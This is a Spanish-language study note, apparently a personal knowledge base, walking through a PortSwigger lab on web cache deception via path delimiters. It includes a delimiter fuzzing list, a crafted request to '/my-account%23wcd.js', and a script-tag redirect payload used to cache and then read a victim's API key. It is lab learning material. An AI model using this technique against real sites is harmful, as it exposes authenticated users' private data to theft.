---
aliases:
  - WCD 002 - path delimiters
  - cache deception delimiters
tags:
  - vuln/web-cache-deception
  - example
  - portswigger
---

# 002 — Delimitadores de path (`;`, `%23`, `%3f`)

> Lab: [Exploiting path delimiters](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters) · **Practitioner** · técnica → [[vulnerabilities/031-web-cache-deception/web-cache-deception|entry point]]

## Qué muestra
Acá el origen **NO** ignora un segmento extra (a diferencia de [[vulnerabilities/031-web-cache-deception/examples/001-path-mapping|001]]): si pedís `/my-account/wcd.js` te da 404. Pero el **origen** y la **caché** discrepan en **qué carácter termina el path**. Si el **origen** trata `;` (o `#` = `%23`) como **delimitador** y **corta** ahí, ve `/my-account` (dinámico). La **caché** no lo trata como delimitador, ve el path entero terminando en `.js` y lo **cachea**.

## Request → Response

> `GET `==`/my-account%23wcd.js`==` HTTP/1.1`
> `Host: victim.web-security-academy.net`
> `Cookie: session=<sesión de la víctima>`

**⬇️ el origen corta en `#` y sirve `/my-account`; la caché ve `...wcd.js` y lo guarda:**

> `HTTP/1.1 200 OK` · `Cache-Control: max-age=30` · ==`X-Cache: miss`==
> `...Your API Key is: `==`<API KEY DE LA VÍCTIMA>`==`...`

## Por qué funciona
- **Origen:** interpreta `%23` (`#`) o `;` como **fin del path** → descarta `wcd.js` → enruta a `/my-account` dinámico con los datos.
- **Caché:** **no** considera ese char un delimitador → la key es el path completo `.../my-account%23wcd.js`, que termina en `.js` → aplica la regla de estático y **cachea**.
- La discrepancia es **qué char delimita el path**, no la extensión (que solo dispara la regla de la caché).

## Cómo encontrar el delimiter (fuzzing)
Los delimitadores dependen del stack. Probá **desde Repeater** (crudos y encodeados):
```
; %3b  #(%23)  ?(%3f)  %00  %0a  %0d  ..  \  ]  {  }  |  %25
```
- Mandá `GET /my-account<DELIM>wcd.js`. Buscá el char que devuelve **la página de la cuenta (200 con datos)** en vez de 404 → ese es el que el **origen** honra como delimitador.
- Confirmá que la respuesta trae headers de caché → ese char te sirve.

## Cómo explotarlo (weaponize)
1. Con el delimiter que funcione, entregá el link a la víctima:
   ```
   <script>document.location="https://victim.web-security-academy.net/my-account%23wcd.js"</script>
   ```
2. La víctima autenticada lo abre → su respuesta queda cacheada.
3. Pedís vos la misma URL → `X-Cache: hit` → **leés la API key de la víctima**.

## Verificación
- Reenviás la URL sin sesión y volvés a recibir los datos de la víctima con ==`X-Cache: hit`==.

## Detalles que se pasan por alto
- **Encodeá el delimiter** cuando el browser lo comería (`#` → `%23`, `;` a veces `%3b`) para que llegue crudo al servidor; en Repeater podés mandar el byte literal.
- **Dos discrepancias en juego:** el **delimiter** (origen corta / caché no) **más** la **extensión** (dispara la regla de la caché). Necesitás ambas.
- Si ningún delimiter simple anda, el corte puede estar en la **normalización** → [[vulnerabilities/031-web-cache-deception/examples/003-origin-server-normalization|003]].

→ Siguiente: [[vulnerabilities/031-web-cache-deception/examples/003-origin-server-normalization|003 · Normalización en el origen]]
